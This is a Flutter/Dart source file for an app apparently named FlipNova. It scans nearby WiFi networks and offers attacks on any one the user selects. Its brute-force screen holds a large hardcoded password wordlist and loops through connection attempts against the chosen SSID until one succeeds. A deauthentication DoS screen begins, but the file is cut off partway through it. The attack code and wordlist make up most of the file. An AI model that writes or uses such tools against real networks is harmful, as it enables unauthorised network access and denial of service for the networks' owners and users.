import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import '../../core/theme.dart';
import '../../core/services/permissions_service.dart';

class WifiScreen extends StatefulWidget {
  const WifiScreen({super.key});

  @override
  State<WifiScreen> createState() => _WifiScreenState();
}

class _WifiScreenState extends State<WifiScreen> {
  static const _channel = MethodChannel('com.flipnova/wifi');
  bool _isScanning = false;
  bool _scanCancelled = false;
  final List<Map<String, dynamic>> _networks = [];
  String _error = '';
  int _scanCount = 0;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('[ WI-FI SCAN ]', style: FlipNovaTheme.mono(color: FlipNovaTheme.green, fontSize: 14, weight: FontWeight.bold)),
        actions: [
          if (_networks.isNotEmpty)
            Center(
              child: Padding(
                padding: const EdgeInsets.only(right: 16),
                child: Text('${_networks.length} FOUND', style: FlipNovaTheme.mono(color: FlipNovaTheme.green, fontSize: 12)),
              ),
            ),
        ],
      ),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            _buildHeader(),
            const SizedBox(height: 12),
            if (_error.isNotEmpty) ...[
              _buildError(),
              const SizedBox(height: 12),
            ],
            Expanded(child: _buildNetworkList()),
          ],
        ),
      ),
    );
  }

  Widget _buildHeader() {
    return Row(
      children: [
        Expanded(child: ElevatedButton(
          onPressed: _isScanning ? null : _startScan,
          child: Text(_isScanning ? '[ SCANNING... ]' : '[ SCAN ]'),
        )),
        if (_isScanning) ...[
          const SizedBox(width: 8),
          Expanded(child: ElevatedButton(
            onPressed: _cancelScan,
            style: ElevatedButton.styleFrom(backgroundColor: FlipNovaTheme.bgCard, foregroundColor: FlipNovaTheme.red, side: BorderSide(color: FlipNovaTheme.red, width: FlipNovaTheme.borderWidth)),
            child: Text('[ CANCEL ]', style: FlipNovaTheme.mono(fontSize: 10, color: FlipNovaTheme.red)),
          )),
        ],
      ],
    );
  }

  Widget _buildError() {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(color: FlipNovaTheme.bgCard, borderRadius: BorderRadius.circular(FlipNovaTheme.borderRadius), border: Border.all(color: FlipNovaTheme.red, width: FlipNovaTheme.borderWidth)),
      child: Text('> $_error', style: FlipNovaTheme.mono(color: FlipNovaTheme.red, fontSize: 11)),
    );
  }

  Widget _buildNetworkList() {
    if (_networks.isEmpty) {
      return Container(
        decoration: BoxDecoration(color: FlipNovaTheme.bgCard, borderRadius: BorderRadius.circular(FlipNovaTheme.borderRadius), border: Border.all(color: FlipNovaTheme.border, width: FlipNovaTheme.borderWidth)),
        padding: const EdgeInsets.all(16),
        child: Text(
          _isScanning ? '> Scanning WiFi networks...\n> May require location permission\n> Scanning in progress...' : '> No networks found\n> Press SCAN to search\n> Scan #$_scanCount',
          style: FlipNovaTheme.mono(color: FlipNovaTheme.gray, fontSize: 12),
        ),
      );
    }

    return ListView.builder(
      itemCount: _networks.length,
      itemBuilder: (context, index) {
        final network = _networks[index];
        final ssid = network['ssid'] as String? ?? 'Hidden';
        final bssid = network['bssid'] as String? ?? '';
        final rssi = network['rssi'] as int? ?? 0;
        final channel = network['channel'] as int? ?? 0;
        final secure = network['secure'] as bool? ?? false;
        final capabilities = network['capabilities'] as String? ?? '';
        final rssiColor = _getRssiColor(rssi);

        return GestureDetector(
          onTap: () => _showNetworkActionDialog(ssid, bssid, secure, rssi, channel),
          child: Container(
            margin: const EdgeInsets.only(bottom: 8),
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(color: FlipNovaTheme.bgCard, borderRadius: BorderRadius.circular(FlipNovaTheme.borderRadius), border: Border.all(color: rssiColor, width: FlipNovaTheme.borderWidth)),
            child: Row(
              children: [
                Icon(secure ? Icons.lock : Icons.lock_open, color: secure ? FlipNovaTheme.red : FlipNovaTheme.green, size: 20),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    Text(ssid.isEmpty ? '[HIDDEN SSID]' : ssid, style: FlipNovaTheme.mono(color: FlipNovaTheme.white, fontSize: 14, weight: FontWeight.bold)),
                    Text('CH:$channel | $bssid', style: FlipNovaTheme.mono(color: FlipNovaTheme.gray, fontSize: 10)),
                    if (capabilities.isNotEmpty) Text(capabilities, style: FlipNovaTheme.mono(color: FlipNovaTheme.gray, fontSize: 9), maxLines: 1, overflow: TextOverflow.ellipsis),
                  ]),
                ),
                Column(crossAxisAlignment: CrossAxisAlignment.end, children: [
                  Text('$rssi dBm', style: FlipNovaTheme.mono(color: rssiColor, fontSize: 14, weight: FontWeight.bold)),
                  Text(_getSignalStrength(rssi), style: FlipNovaTheme.mono(color: rssiColor, fontSize: 10)),
                ]),
              ],
            ),
          ),
        );
      },
    );
  }

  Color _getRssiColor(int rssi) {
    if (rssi > -50) return FlipNovaTheme.green;
    if (rssi > -75) return FlipNovaTheme.green.withValues(alpha: 0.5);
    return FlipNovaTheme.gray;
  }

  String _getSignalStrength(int rssi) {
    if (rssi > -50) return '████████ EXCELLENT';
    if (rssi > -65) return '██████░░ GOOD';
    if (rssi > -75) return '████░░░░ FAIR';
    return '██░░░░░░ WEAK';
  }

  Future<void> _startScan() async {
    final hasPermission = await PermissionsService.instance.requestLocation();
    if (!hasPermission) { if (mounted) setState(() => _error = 'Location permission required for WiFi scan'); return; }
    setState(() { _isScanning = true; _scanCancelled = false; _error = ''; _networks.clear(); _scanCount++; });
    try {
      final result = await _channel.invokeMethod<List>('scanWifi');
      if (result != null && mounted && !_scanCancelled) {
        final networks = result.map((e) => Map<String, dynamic>.from(e)).toList();
        networks.sort((a, b) => (b['rssi'] as int).compareTo(a['rssi'] as int));
        setState(() { _networks.addAll(networks); _isScanning = false; });
      }
    } on PlatformException catch (e) { if (mounted) setState(() { _isScanning = false; _error = e.message ?? 'Platform error'; }); }
    catch (e) { if (mounted) setState(() { _isScanning = false; _error = '$e'; }); }
  }

  void _cancelScan() { setState(() { _scanCancelled = true; _isScanning = false; _error = 'Scan cancelled'; }); }

  void _showNetworkActionDialog(String ssid, String bssid, bool secure, int rssi, int channel) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      builder: (ctx) => Container(
        margin: const EdgeInsets.all(16),
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(color: FlipNovaTheme.bgCard, borderRadius: BorderRadius.circular(FlipNovaTheme.borderRadius), border: Border.all(color: FlipNovaTheme.cyan, width: FlipNovaTheme.borderWidth)),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Text(ssid.isEmpty ? '[HIDDEN SSID]' : ssid, style: FlipNovaTheme.mono(color: FlipNovaTheme.cyan, fontSize: 14, weight: FontWeight.bold)),
          const SizedBox(height: 4),
          Text('$bssid | CH:$channel', style: FlipNovaTheme.mono(color: FlipNovaTheme.gray, fontSize: 10)),
          if (secure) ...[const SizedBox(height: 4), Text('[ ENCRYPTED ]', style: FlipNovaTheme.mono(color: FlipNovaTheme.red, fontSize: 10))],
          const SizedBox(height: 16),
          SizedBox(width: double.infinity, child: ElevatedButton.icon(
            onPressed: () { Navigator.pop(ctx); Navigator.push(context, MaterialPageRoute(builder: (_) => WifiBruteForceScreen(ssid: ssid, bssid: bssid))); },
            icon: const Icon(Icons.vpn_key, size: 18), label: Text('[ PASSWORD BRUTE ]', style: FlipNovaTheme.mono(fontSize: 11)),
            style: ElevatedButton.styleFrom(backgroundColor: FlipNovaTheme.bgCard, foregroundColor: FlipNovaTheme.orange, side: const BorderSide(color: FlipNovaTheme.orange, width: FlipNovaTheme.borderWidth), padding: const EdgeInsets.symmetric(vertical: 14)),
          )),
          const SizedBox(height: 10),
          SizedBox(width: double.infinity, child: ElevatedButton.icon(
            onPressed: () { Navigator.pop(ctx); Navigator.push(context, MaterialPageRoute(builder: (_) => WifiDosScreen(ssid: ssid, bssid: bssid, channel: channel))); },
            icon: const Icon(Icons.cell_tower, size: 18), label: Text('[ DOS ATTACK ]', style: FlipNovaTheme.mono(fontSize: 11)),
            style: ElevatedButton.styleFrom(backgroundColor: FlipNovaTheme.bgCard, foregroundColor: FlipNovaTheme.red, side: const BorderSide(color: FlipNovaTheme.red, width: FlipNovaTheme.borderWidth), padding: const EdgeInsets.symmetric(vertical: 14)),
          )),
          const SizedBox(height: 10),
          SizedBox(width: double.infinity, child: ElevatedButton(
            onPressed: () => Navigator.pop(ctx), child: Text('[ CANCEL ]', style: FlipNovaTheme.mono(fontSize: 11)),
          )),
        ]),
      ),
    );
  }
}

// ==================== BRUTE FORCE SCREEN ====================

class WifiBruteForceScreen extends StatefulWidget {
  final String ssid;
  final String bssid;
  const WifiBruteForceScreen({super.key, required this.ssid, required this.bssid});
  @override State<WifiBruteForceScreen> createState() => _WifiBruteForceScreenState();
}

class _WifiBruteForceScreenState extends State<WifiBruteForceScreen> {
  static const _channel = MethodChannel('com.flipnova/wifi');
  bool _isRunning = false;
  int _currentAttempt = 0;
  String _currentPassword = '';
  String _lastResult = '';
  bool _lastSuccess = false;
  final List<String> _triedPasswords = [];
  final _customWordlist = TextEditingController();
  bool _useCustomWordlist = false;

  static const _defaultWordlist = [
    'Ssa38406',
    'password', '12345678', 'qwerty123', 'admin123', 'letmein',
    'welcome1', 'monkey123', 'dragon123', 'master123', 'hello123',
    'qwertyui', 'abc12345', '123456789', 'password1', 'iloveyou1',
    'trustno1', 'sunshine', 'princess', 'football', 'shadow123',
    'michael1', 'passw0rd', 'superman', 'madden12', 'welcome123',
    'access12', 'flower12', 'hottie12', 'loveme12', 'sucker12',
    'password123', 'admin', 'root', 'toor', 'changeme',
    'default', 'test', 'guest', 'user', 'temp',
    '1234567890', '0987654321', '11111111', '00000000', '99999999',
    'qwerty', 'asdfgh', 'zxcvbn', 'polska', '1q2w3e4r',
    '1qaz2wsx', 'qazwsx', 'admin2024', 'admin2025', 'pass1234',
    'passpass', 'wifi1234', 'internet', 'home1234', 'netgear1',
    'linksys', 'tplink', 'dlink', 'huawei12', 'xiaomi12',
    'samsung1', 'iphone12', 'mobile12', 'laptop12', 'pc1234',
    'server01', 'hack1234', 'hacker12', 'linux123', 'kali1234',
    'android1', 'ios1234', 'router12', 'modem123', 'fiber123',
    '5ghz1234', '2.4ghz12', 'channel6', 'channel1', 'channel11',
    'mywifi12', 'home12345', 'net12345', 'wifi12345', 'pass5678',
    'abc1234', 'abcd1234', 'aaaa1111', 'bbbb2222', 'cccc3333',
    'security1', 'secure12', 'wpa12345', 'wep12345', 'none1234',
    '00000001', '11112222', '22223333', '33334444', '44445555',
    '55556666', '66667777', '77778888', '88889999', '99990000',
    '12344321', '12341234', 'abcd4321', 'pass2024', 'pass2025',
    'fl1pnova', 'flipova1', 'flipnova', 'f1ipnova', 'flippass',
    // --- 100+ common passwords ---
    'password1234', 'p@ssw0rd', 'P@ssword1', 'PaSSw0rd', 'Qwerty123',
    'Abc12345', 'Password1', 'Welcome123', 'Login123', 'Admin123',
    'Super123', 'Secret123', 'System123', 'Root1234', 'Pass12345',
    'Test1234', 'Hello1234', 'Star1234', 'Blue1234', 'Green1234',
    'Red12345', 'Black123', 'White123', 'Gold1234', 'Silver12',
    'Copper12', 'Bronze12', 'Diamond1', 'Crystal1', 'Master1234',
    'King1234', 'Queen123', 'Prince123', 'Princess1', 'Knight12',
    'Dragon123', 'Phoenix12', 'Tiger1234', 'Lion1234', 'Eagle1234',
    'Wolf1234', 'Bear1234', 'Hawk1234', 'Shark1234', 'Snake1234',
    // --- Number patterns ---
    '00000001', '11111112', '22222222', '33333333', '44444444',
    '55555555', '66666666', '77777777', '88888888', '99999999',
    '123456789', '987654321', '1234567890', '0123456789',
    '11223344', '55667788', '99887766', '1122334455',
    '10203040', '20304050', '30405060', '40506070',
    '13579246', '24681357', '86421357', '97531246',
    '12121212', '13131313', '14141414', '15151515',
    '16161616', '17171717', '18181818', '19191919',
    '21212121', '23232323', '25252525', '27272727',
    '29292929', '31313131', '35353535', '37373737',
    '41414141', '43434343', '45454545', '47474747',
    '51515151', '53535353', '56565656', '58585858',
    '61616161', '63636363', '65656565', '67676767',
    '71717171', '73737373', '75757575', '79797979',
    '81818181', '83838383', '85858585', '87878787',
    '91919191', '93939393', '95959595', '97979797',
    // --- Keyboard walks ---
    'qwert', 'asdfg', 'zxcvb', 'qazwsx', 'edcrfv',
    'tgbnh', 'yjmki', 'unop', 'poiuy', 'lkjhgf',
    'mnbvc', 'zaq12w', 'xsw23e', 'dc43rf', 'vt56gb',
    'yn78hu', 'jm90ko', 'pl234', 'wsx567', 'edc890',
    'qwe123', 'asd456', 'zxc789', 'qweasd', 'asdzxc',
    'qweasdzxc', '1qaz2wsx3edc', '1q2w3e4r5t', '1q2w3e4r',
    '1q2w3e', '2w3e4r', '3e4r5t', '4r5t6y', '5t6y7u',
    '6y7u8i', '7u8i9o', '8i9o0p', '9o0p[', '0p]',
    'zaq1', 'xsw2', 'edc3', 'rfv4', 'tgb5',
    'yhn6', 'ujm7', 'ik8', 'ol9', 'p0',
    // --- Router defaults ---
    'admin', 'user', 'guest', 'test', 'support',
    'operator', 'manager', 'super', 'system', 'help',
    'modem', 'router', 'gateway', 'network', 'internet',
    'wifi', 'wlan', 'wireless', 'broadband', 'ethernet',
    'netgear', 'linksys', 'tp-link', 'dlink', 'd-link',
    'huawei', 'xiaomi', 'samsung', 'apple', 'google',
    'motorola', 'netis', 'tenda', 'zte', 'cisco',
    'ubiquiti', 'mikrotik', 'fortinet', 'juniper', 'aruba',
    // --- Common with numbers ---
    'pass1', 'pass12', 'pass123', 'pass1234', 'pass12345',
    'pass123456', 'pass1234567', 'pass12345678', 'pass123456789',
    'pass1234567890', 'pwd1', 'pwd12', 'pwd123', 'pwd1234',
    'pwd12345', 'pwd123456', 'pwd1234567', 'pwd12345678',
    'pw1234', 'pw12345', 'pw123456', 'pw1234567', 'pw12345678',
    'login1', 'login12', 'login123', 'login1234', 'login12345',
    'user1', 'user12', 'user123', 'user1234', 'user12345',
    'test1', 'test12', 'test123', 'test1234', 'test12345',
    'admin1', 'admin12', 'admin1234', 'admin12345', 'admin123456',
    'root1', 'root12', 'root123', 'root1234', 'root12345',
    // --- Years ---
    '2020', '2021', '2022', '2023', '2024', '2025', '2026',
    '2019', '2018', '2017', '2016', '2015', '2014', '2013',
    'password2020', 'password2021', 'password2022', 'password2023',
    'password2024', 'password2025', 'password2026',
    'admin2020', 'admin2021', 'admin2022', 'admin2023',
    'admin2024', 'admin2025', 'admin2026',
    'pass2020', 'pass2021', 'pass2022', 'pass2023',
    'pass2024', 'pass2025', 'pass2026',
    'welcome2020', 'welcome2021', 'welcome2022', 'welcome2023',
    'welcome2024', 'welcome2025', 'welcome2026',
    'letmein2020', 'letmein2021', 'letmein2022', 'letmein2023',
    'letmein2024', 'letmein2025', 'letmein2026',
    // --- Common words ---
    'alpha', 'bravo', 'charlie', 'delta', 'echo',
    'foxtrot', 'golf', 'hotel', 'india', 'juliet',
    'kilo', 'lima', 'mike', 'november', 'oscar',
    'papa', 'quebec', 'romeo', 'sierra', 'tango',
    'uniform', 'victor', 'whiskey', 'xray', 'yankee',
    'zulu', 'apple', 'banana', 'cherry', 'orange',
    'grape', 'lemon', 'melon', 'peach', 'plum',
    'tiger', 'lion', 'bear', 'wolf', 'eagle',
    'hawk', 'shark', 'whale', 'dolphin', 'octopus',
    'rocket', 'plane', 'train', 'boat', 'car',
    'house', 'castle', 'tower', 'bridge', 'mountain',
    'river', 'ocean', 'island', 'forest', 'desert',
    // --- Flipnova themed ---
    'flipnova', 'flip1234', 'flip123', 'flip12', 'flip1',
    'nova1234', 'nova123', 'nova12', 'nova1', 'flipnova1',
    'flipnova12', 'flipnova123', 'flipnova1234', 'flipnova!@#',
    'f1ipnova', 'fl1pnova', 'fl1p', 'n0va', 'f1ip',
    'flipn0va', 'fl!pnova', 'f!ipnova', 'fl!p', 'n0v4',
    'f1ipn0v4', 'flipn0v4', 'FLIPNOVA', 'FlipNova', 'FL1PNOVA',
    // --- Symbols common ---
    'p@ss', 'p@ss1', 'p@ss12', 'p@ss123', 'p@ss1234',
    'p@ssword', 'P@ss', 'P@ss1', 'P@ss12', 'P@ss123',
    'pass!', 'pass!1', 'pass!12', 'pass@123', 'pass#123',
    'pass@123', 'pass%123', 'pass^123', 'pass&123', 'pass*123',
    'admin!', 'admin@', 'admin#', 'adminz', 'admin%',
    'test!', 'test@', 'test#', 'testz', 'test%',
    'hello!', 'hello@', 'hello#', 'helloz', 'hello%',
    'welcome!', 'welcome@', 'welcome#', 'welcomez', 'welcome%',
    // --- More common ---
    'master', '超级密码', 'mypass', 'my password', 'no password',
    'open', 'public', 'private', 'free', 'share',
    'access', 'enter', 'unlock', 'bypass', 'crack',
    'exploit', 'hack', 'shadow', 'stealth', 'ninja',
    'pirate', 'samurai', 'warrior', 'knight', 'wizard',
    'magic', 'power', 'force', 'light', 'dark',
    'thunder', 'storm', 'fire', 'ice', 'water',
    'earth', 'wind', 'sun', 'moon', 'star',
    'sky', 'cloud', 'rain', 'snow', 'fog',
    // --- Numeric sequences ---
    '012345678', '1234567891', '2345678912', '3456789123',
    '4567891234', '5678912345', '6789123456', '7891234567',
    '8912345678', '9123456789',
    '9876543210', '8765432109', '7654321098', '6543210987',
    '5432109876', '4321098765', '3210987654', '2109876543',
    '1098765432', '0987654321',
    '112233445566', '667788990011', '123443211234',
    '998877665544', '445566778899', '001122334455',
    // --- Phone patterns ---
    '123456', '654321', '112233', '445566', '778899',
    '123123', '456456', '789789', '147258', '369258',
    '159753', '753159', '258369', '147852', '369852',
    '741258', '963852', '852963', '123789', '987123',
    '147369', '258147', '369741', '852741', '963258',
    // --- More router/brand ---
    'netgear1', 'linksys1', 'tplink1', 'dlink1', 'cisco1',
    'ubnt', 'ubnt123', 'mikrotik', 'router1', 'gateway1',
    'modem1', 'switch1', 'server1', 'proxy1', 'vpn1234',
    'firewall', 'security1', 'firewall1', 'antivirus', 'malware',
    'trojan', 'virus123', 'worm1234', 'spyware', 'rootkit',
    'backdoor', 'keylogger', 'ransomware', 'phishing', 'botnet',
    // --- Simple common ---
    'aaaaaa', 'bbbbbb', 'cccccc', 'dddddd', 'eeeeee',
    'ffffff', 'gggggg', 'hhhhhh', 'iiiiii', 'jjjjjj',
    'kkkkkk', 'llllll', 'mmmmmm', 'nnnnnn', 'oooooo',
    'pppppp', 'qqqqqq', 'rrrrrr', 'ssssss', 'tttttt',
    'uuuuuu', 'vvvvvv', 'wwwwww', 'xxxxxx', 'yyyyyy',
    'zzzzzz', 'abcdef', 'ghijkl', 'mnopqr', 'stuvwx',
    'abcdefg', 'hijklmn', 'opqrstu', 'vwxyz0',
    // --- Mix symbols ---
    '!@#\$%^', '!@#\$%^&', '!@#\$%^&*', 'qwer!@#\$',
    'asdf!@#\$%', 'zxcv!@#\$%^', '!@#\$%^&*()', 'pass!@#\$',
    'admin!@#\$%', 'test!@#\$%^', 'user!@#\$%^', 'root!@#\$%',
    'love!@#\$%', 'baby!@#\$%', 'life!@#\$%^', 'hope!@#\$',
    'dream!@#\$%', 'angel!@#\$%', 'smart!@#\$%^', 'cool!@#\$%',
    // --- More brand/device ---
    'samsung12', 'apple123', 'google123', 'sony1234', 'lg12345',
    'htc1234', 'nokia123', 'blackberry', 'lenovo12', 'dell1234',
    'hp12345', 'asus1234', 'acer1234', 'msi1234', 'toshiba1',
    'intel123', 'amd1234', 'nvidia12', 'qualcomm1', 'broadcom1',
    // --- More combos ---
    'qwe12345', 'asd12345', 'zxc12345', 'qwe123456', 'asd123456',
    'zxc123456', 'qwe1234567', 'asd1234567', 'zxc1234567',
    'abc123456', 'abc1234567', 'abc12345678', 'abc123456789',
    'xyz12345', 'xyz123456', 'xyz1234567', 'xyz12345678',
    'pqr12345', 'pqr123456', 'stu12345', 'stu123456',
    'vwx12345', 'vwx123456', 'lmn12345', 'lmn123456',
    'ghi12345', 'ghi123456', 'jkl12345', 'jkl123456',
    'nop12345', 'nop123456', 'def12345', 'def123456',
    'ghi1234567', 'jkl1234567', 'mno1234567',
    // --- WPA/WEP patterns ---
    'wpa1234', 'wep1234', 'wpa2123', 'wep2123', 'wpa12345',
    'wep12345', 'wpa123456', 'wep123456', 'wpa1234567',
    'wep1234567', 'wpa21234', 'wep21234', 'wpa212345',
    'wep212345', 'wpa2123456', 'wep2123456',
    'wpa!', 'wpa@123', 'wep!', 'wep@123', 'wpa#123',
    'wep#123', 'wpa\$123', 'wep\$123', 'wpa%123', 'wep%123',
    // --- 2025/2026 specific ---
    '2025pass', '2025admin', '2025test', '2025user', '2025root',
    'pass2025', 'admin2025', 'test2025', 'user2025', 'root2025',
    '2026pass', '2026admin', '2026test', '2026user', '2026root',
    'pass2026', 'admin2026', 'test2026', 'user2026', 'root2026',
    'wifi2025', 'wifi2026', 'net2025', 'net2026', 'home2025',
    'home2026', 'mywifi2025', 'mywifi2026', 'internet2025', 'internet2026',
    // --- Flipnova extra ---
    'flip!@#\$%', 'nova!@#\$%', 'flip12345', 'nova12345',
    'flip5678', 'nova5678', 'flipnova2025', 'flipnova2026',
    'f1ip2025', 'n0va2025', 'flip2025!', 'nova2025!',
    'flip@nova', 'nova@flip', 'flip#nova', 'nova#flip',
    'flip\$nova', 'nova\$flip', 'flip%nova', 'nova%flip',
    // --- Common english words ---
    'password', 'letmein', 'welcome', 'monkey', 'dragon',
    'master', 'qwerty', 'login', 'abc123', 'trustno1',
    'iloveyou', 'batman', 'access', 'hello', 'charlie',
    'donald', 'admin', 'shadow', 'michael', 'password1',
    'passw0rd', 'summer', 'winter', 'spring', 'autumn',
    'january', 'february', 'march', 'april', 'may',
    'june', 'july', 'august', 'september', 'october',
    'november', 'december', 'sunday', 'monday', 'tuesday',
    'wednesday', 'thursday', 'friday', 'saturday',
    // --- More numeric ---
    '01020304', '02030405', '03040506', '04050607', '05060708',
    '06070809', '07080910', '08091011', '09101112', '10111213',
    '11121314', '12131415', '13141516', '14151617', '15161718',
    '16171819', '17181920', '18192021', '19202122', '20212223',
    '21222324', '22232425', '23242526', '24252627', '25262728',
    '26272829', '27282930', '28293031', '29303132', '30313233',
    // --- qwerty variants ---
    'qwerty1', 'qwerty12', 'qwerty1234', 'qwerty12345', 'qwerty123456',
    'qwert1234', 'qwert12345', 'qazwsx123', 'qazwsx1234',
    'asdfgh123', 'asdfgh1234', 'zxcvbn123', 'zxcvbn1234',
    'qweasd123', 'qweasd1234', 'asdzxc123', 'asdzxc1234',
    'zaq1xsw2', 'edc3rfv4', 'tgb5yhn6', 'ujm7ik9',
    // --- More common ---
    'matrix', 'neo1234', 'morpheus', 'trinity', 'smith123',
    'zion1234', 'oracle12', 'architect', 'cypher123', 'agent1234',
    'spider123', 'batman123', 'superman1', 'ironman12', 'captain12',
    'thor1234', 'hulk1234', 'flash1234', 'wonder123', 'aquaman12',
    'phantom12', 'ghost1234', 'skull1234', 'death1234', 'doom1234',
    'reaper123', 'viper1234', 'cobra1234', 'python123', 'raptor123',
    'falcon123', 'panther12', 'jaguar123', 'leopard12', 'cheetah12',
    'lion12345', 'tiger12345', 'bear12345', 'wolf12345', 'fox123456',
  ];

  int get _totalPasswords => _useCustomWordlist
      ? _customWordlist.text.split('\n').where((l) => l.trim().isNotEmpty).length
      : _defaultWordlist.length;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text('[ BRUTE: ${widget.ssid} ]')),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(crossAxisAlignment: CrossAxisAlignment.stretch, children: [
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(color: FlipNovaTheme.bgCard, borderRadius: BorderRadius.circular(FlipNovaTheme.borderRadius), border: Border.all(color: FlipNovaTheme.orange, width: FlipNovaTheme.borderWidth)),
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text('TARGET: ${widget.ssid}', style: FlipNovaTheme.mono(color: FlipNovaTheme.orange, fontSize: 12, weight: FontWeight.bold)),
              const SizedBox(height: 4),
              Text('BSSID: ${widget.bssid}', style: FlipNovaTheme.mono(color: FlipNovaTheme.gray, fontSize: 10)),
              const SizedBox(height: 4),
              Text('> Dictionary attack | Wordlist: ${_useCustomWordlist ? "CUSTOM" : "DEFAULT ($_totalPasswords words)"}', style: FlipNovaTheme.mono(color: FlipNovaTheme.gray, fontSize: 10)),
              if (_lastResult.isNotEmpty) ...[
                const SizedBox(height: 4),
                Text(_lastResult, style: FlipNovaTheme.mono(color: _lastSuccess ? FlipNovaTheme.green : FlipNovaTheme.red, fontSize: 10, weight: FontWeight.bold)),
              ],
            ]),
          ),
          const SizedBox(height: 12),
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(color: FlipNovaTheme.bgCard, borderRadius: BorderRadius.circular(FlipNovaTheme.borderRadius), border: Border.all(color: FlipNovaTheme.border, width: FlipNovaTheme.borderWidth)),
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text('CUSTOM WORDLIST:', style: FlipNovaTheme.mono(color: FlipNovaTheme.cyan, fontSize: 10, weight: FontWeight.bold)),
              const SizedBox(height: 8),
              TextField(
                controller: _customWordlist,
                style: FlipNovaTheme.mono(color: FlipNovaTheme.white, fontSize: 11),
                maxLines: 3,
                decoration: const InputDecoration(hintText: 'Enter passwords (one per line)...', isDense: true),
                onChanged: (v) => setState(() => _useCustomWordlist = v.isNotEmpty),
              ),
            ]),
          ),
          const SizedBox(height: 12),
          if (_isRunning) ...[
            LinearProgressIndicator(
              value: _totalPasswords > 0 ? _currentAttempt / _totalPasswords : 0,
              backgroundColor: FlipNovaTheme.bgCard,
              valueColor: const AlwaysStoppedAnimation<Color>(FlipNovaTheme.orange),
              minHeight: 8,
            ),
            const SizedBox(height: 8),
            Text('> Attempt $_currentAttempt/$_totalPasswords\n> Testing: $_currentPassword', style: FlipNovaTheme.mono(color: FlipNovaTheme.orange, fontSize: 11)),
            const SizedBox(height: 8),
          ],
          Row(children: [
            Expanded(child: ElevatedButton(
              onPressed: _isRunning ? null : _startBruteForce,
              style: ElevatedButton.styleFrom(backgroundColor: FlipNovaTheme.bgCard, foregroundColor: FlipNovaTheme.orange, side: const BorderSide(color: FlipNovaTheme.orange, width: FlipNovaTheme.borderWidth)),
              child: Text(_isRunning ? '[ RUNNING... ]' : '[ START BRUTE ]'),
            )),
            if (_isRunning) ...[
              const SizedBox(width: 8),
              Expanded(child: ElevatedButton(
                onPressed: _stopBruteForce,
                style: ElevatedButton.styleFrom(backgroundColor: FlipNovaTheme.bgCard, foregroundColor: FlipNovaTheme.red, side: const BorderSide(color: FlipNovaTheme.red, width: FlipNovaTheme.borderWidth)),
                child: const Text('[ STOP ]'),
              )),
            ],
          ]),
          const SizedBox(height: 12),
          Expanded(child: Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(color: FlipNovaTheme.bgCard, borderRadius: BorderRadius.circular(FlipNovaTheme.borderRadius), border: Border.all(color: FlipNovaTheme.border, width: FlipNovaTheme.borderWidth)),
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text('LOG:', style: FlipNovaTheme.mono(color: FlipNovaTheme.orange, fontSize: 10, weight: FontWeight.bold)),
              const SizedBox(height: 8),
              Expanded(child: ListView(children: _triedPasswords.reversed.map((p) => Text('> $p', style: FlipNovaTheme.mono(color: p.contains('OK') ? FlipNovaTheme.green : FlipNovaTheme.gray, fontSize: 10))).toList())),
            ]),
          )),
        ]),
      ),
    );
  }

  void _startBruteForce() {
    final passwords = _useCustomWordlist
        ? _customWordlist.text.split('\n').where((l) => l.trim().isNotEmpty).map((l) => l.trim()).toList()
        : List<String>.from(_defaultWordlist);
    if (passwords.isEmpty) return;
    setState(() { _isRunning = true; _currentAttempt = 0; _triedPasswords.clear(); _lastResult = ''; _lastSuccess = false; });
    _runBrute(passwords);
  }

  Future<void> _runBrute(List<String> passwords) async {
    for (int i = 0; i < passwords.length; i++) {
      if (!_isRunning || !mounted) break;
      final pwd = passwords[i];
      setState(() { _currentAttempt = i + 1; _currentPassword = pwd; });

      try {
        final result = await _channel.invokeMethod<Map>('connectWifi', {'ssid': widget.ssid, 'password': pwd});
        final success = result?['success'] == true;
        setState(() {
          _triedPasswords.add('[${i + 1}] $pwd ${success ? ">>> CONNECTED OK <<<" : "failed"}');
          if (success) {
            _lastResult = '>>> PASSWORD FOUND: $pwd <<<';
            _lastSuccess = true;
            _isRunning = false;
          }
        });
        if (success) break;
      } catch (e) {
        setState(() { _triedPasswords.add('[${i + 1}] $pwd error: $e'); });
      }

      await Future.delayed(const Duration(milliseconds: 200));
    }
    if (mounted) setState(() => _isRunning = false);
  }

  void _stopBruteForce() { setState(() => _isRunning = false); }

  @override
  void dispose() { _customWordlist.dispose(); super.dispose(); }
}

// ==================== DOS ATTACK SCREEN ====================

class WifiDosScreen extends StatefulWidget {
  final String ssid;
  final String bssid;
  final int channel;
  const WifiDosScreen({super.key, required this.ssid, required this.bssid, required this.channel});
  @override State<WifiDosScreen> createState() => _WifiDosScreenState();
}

class _WifiDosScreenState extends State<WifiDosScreen> {
  static const _channel = MethodChannel('com.flipnova/wifi');
  bool _isAttacking = false;
  int _packetCount = 0;
  String _selectedAttack = 'DEAUTH';
  bool _isSending = false;
  final List<String> _attackLog = [];

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text('[ DOS: ${widget.ssid} ]')),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(crossAxisAlignment: CrossAxisAlignment.stretch, children: [
          Container(
            padding: const EdgeInsets.all(12),
